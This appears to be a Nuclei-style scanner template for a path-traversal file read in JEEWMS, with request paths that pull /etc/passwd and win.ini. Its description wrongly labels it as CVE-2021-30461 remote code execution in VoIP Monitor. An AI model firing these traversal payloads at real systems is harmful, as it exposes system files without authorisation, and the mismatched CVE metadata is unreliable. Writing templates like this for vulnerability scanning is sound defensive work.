id: JEEWMS-File-Read
info:
  author: shifacyclewala, hackergautam
  description: A malicious actor can trigger Un authenticated Remote Code Execution
    using CVE-2021-30461.
  name: Jeewms
  reference: unknown
  severity: critical
  tags: cve,cve2021,rce,voip monitor
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - 'root:[x*]:0:0:'
    - for 16-bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd'
  - '{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini'
